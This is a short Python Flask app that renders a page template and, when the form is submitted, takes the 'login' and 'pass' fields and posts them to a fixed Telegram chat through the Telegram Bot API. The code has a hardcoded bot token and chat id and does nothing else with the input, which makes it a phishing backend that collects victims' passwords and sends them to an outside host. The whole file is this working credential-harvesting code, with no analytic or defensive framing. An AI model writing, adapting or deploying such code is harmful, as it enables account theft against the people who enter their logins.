from flask import Flask, render_template, request
import requests


app = Flask(__name__)

def send_message(chat_id, text):
    method = "sendMessage"
    token = "1452670742:AAHN891Ygs_gRtr1zFB7uRbN72IzLrfui1U"
    url = f"https://api.telegram.org/bot{token}/{method}"
    data = {"chat_id": chat_id, "text": text}
    requests.post(url, data=data)


@app.route('/', methods = ['GET', 'POST'])
def index():
    if request.method == 'POST':
        login = request.form.get('login')
        password = request.form.get('pass')
        chat_id = '270399117'
        send_message(chat_id, login + ' ' + password)

    
    return render_template('index.html')



if __name__ == '__main__':
    app.run()